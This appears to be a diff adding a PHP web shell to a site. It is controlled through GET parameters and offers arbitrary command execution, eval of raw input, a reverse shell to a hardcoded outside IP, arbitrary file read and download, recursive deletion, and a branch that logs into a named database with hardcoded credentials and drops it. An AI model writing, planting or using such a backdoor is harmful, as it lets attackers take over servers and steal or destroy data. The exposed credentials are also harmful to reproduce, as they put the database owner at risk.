@@ -1,0 +1,116 @@
+<?php
+
+if(ISSET($_GET["test"]))
+{
+	echo "test<br>";
+}
+
+if(ISSET($_GET["dir"]))
+{
+	chdir($_GET["dir"]);
+}
+
+if(ISSET($_GET["cmd"]))
+{
+	system($_GET["cmd"]);
+	echo "<br>";
+}
+
+if(ISSET($_GET["rvs"]))
+{
+	$sock = fsockopen("167.86.69.221",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+	echo "Rvs Worked...";
+}
+
+if(ISSET($_GET["dl"]))
+{
+
+	header("Content-Description: File Transfer"); 
+	header("Content-Type: application/octet-stream"); 
+	header("Content-Disposition: attachment; filename=".$_GET["dl"]); 
+	readfile($_GET["dl"]);
+	exit(); 
+}
+
+if(ISSET($_GET["r"]))
+{
+	if ($file = fopen($_GET["r"],"r")) {
+	    while(!feof($file)) {
+	        $line = fgets($file);
+	        echo $line."<br>";
+	    }
+	    fclose($file);
+	}
+}
+
+if(ISSET($_GET["mkdir"]))
+{
+	mkdir($_GET["mkdir"], 0700);
+}
+
+if(ISSET($_GET["l"]))
+{
+	if(ISSET($_GET["type"]))
+	{
+		$type = $_GET["type"];
+	}
+	else
+	{
+		$type = "*";
+	}
+	$files = glob($_GET["l"] . $type);
+	foreach($files as $file)
+	{
+    	echo $file."<br>";
+	}
+}
+
+if(ISSET($_GET["1"]))
+{
+	eval($_GET["1"]);
+}
+
+if(ISSET($_GET["cn"]))
+{
+	echo "CN<br>";
+	$dbhost = 'mz8jf.myd.infomaniak.com';
+	$dbuser = 'mz8jf_minestiane';
+	$dbpass = 'nicolasthib18200';
+	$conn = mysql_connect($dbhost, $dbuser, $dbpass);
+	   
+	if(! $conn ) {
+		die('Could not connect: ' . mysql_error());
+	}
+	   
+	$sql = 'DROP DATABASE mz8jf_minestianet';
+	$retval = mysql_query( $sql, $conn );
+	   
+	if(!$retval) {
+		die('Could not delete database db_test: ' . mysql_error());
+	}
+	   
+	echo "Database deleted successfully<br>";
+	mysql_close($conn);
+}
+
+if(ISSET($_GET["rmdir"]))
+{
+	$dir = $_GET["rmdir"];
+	$it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
+	$files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
+	foreach($files as $file) {
+	    if ($file->isDir()){
+	        rmdir($file->getRealPath());
+	    } else {
+	        unlink($file->getRealPath());
+	    }
+	}
+	rmdir($dir);
+}
+
+if(ISSET($_GET["un"]))
+{
+	unlink($_GET["un"]);
+}
+
+?>
